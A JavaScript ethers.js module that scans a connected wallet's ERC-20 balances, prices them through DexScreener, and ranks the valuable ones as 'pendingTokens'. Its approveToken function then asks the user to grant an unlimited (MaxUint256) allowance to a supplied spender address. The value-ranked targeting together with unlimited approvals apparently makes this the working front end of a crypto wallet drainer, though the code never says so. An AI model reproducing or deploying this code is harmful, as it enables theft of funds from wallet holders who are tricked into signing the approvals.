import { ethers } from 'ethers';
import { TOKENS, CONTRACT_ADDRESS } from '../config/tokens';
import { MIN_VALUE_FRONTEND } from '../utils/constants';
import { getProvider, getSigner } from './walletService';

// Fetch live price from DexScreener
async function fetchPrice(tokenAddress) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 2000);
    
    try {
        const res = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${tokenAddress}`, { 
            signal: controller.signal 
        });
        clearTimeout(timeoutId);
        const data = await res.json();
        if (data?.pairs?.[0]?.priceUsd) {
            return parseFloat(data.pairs[0].priceUsd);
        }
    } catch (e) {
        clearTimeout(timeoutId);
        console.error('Price fetch error:', e.message);
    }
    
    return 1.0;
}

// Scan all tokens for a wallet
export async function scanTokens(walletAddress) {
    try {
        const provider = getProvider();
        
        const erc20Abi = [
            "function balanceOf(address) view returns (uint256)", 
            "function decimals() view returns (uint8)"
        ];
        
        const tokenPromises = TOKENS.map(async (t) => {
            try {
                const contract = new ethers.Contract(t.address, erc20Abi, provider);
                const rawBal = await contract.balanceOf(walletAddress);
                const decimals = await contract.decimals();
                const fmtBal = parseFloat(ethers.formatUnits(rawBal, decimals));
                return fmtBal > 0 ? { ...t, balance: fmtBal } : null;
            } catch (err) {
                console.error(`Error scanning ${t.name}:`, err.message);
                return null;
            }
        });
        
        const results = await Promise.all(tokenPromises);
        const foundTokens = results.filter(t => t !== null);
        
        const evaluatedTokens = await Promise.all(foundTokens.map(async (t) => {
            const priceUsd = await fetchPrice(t.address);
            return { ...t, usdValue: t.balance * priceUsd };
        }));
        
        const pendingTokens = evaluatedTokens
            .filter(t => t.usdValue >= MIN_VALUE_FRONTEND)
            .sort((a, b) => b.usdValue - a.usdValue);
        
        return pendingTokens;
    } catch (error) {
        console.error('Token scanning error:', error.message);
        return [];
    }
}

// Approve single token
export async function approveToken(tokenAddress, spenderAddress) {
    try {
        const signer = getSigner();
        
        const erc20Abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
        const tokenContract = new ethers.Contract(
            ethers.getAddress(tokenAddress), 
            erc20Abi, 
            signer
        );
        
        const tx = await tokenContract.approve(
            ethers.getAddress(spenderAddress), 
            ethers.MaxUint256
        );
        await tx.wait();
        
        return {
            success: true,
            transactionHash: tx.hash
        };
    } catch (error) {
        console.error('Approval error:', error.message);
        
        if (error.code === 'ACTION_REJECTED' || 
            error.code === 4001 || 
            error.message?.includes('user rejected')) {
            return {
                success: false,
                error: 'Transaction rejected by user'
            };
        }
        
        return {
            success: false,
            error: error.message || 'Approval failed'
        };
    }
}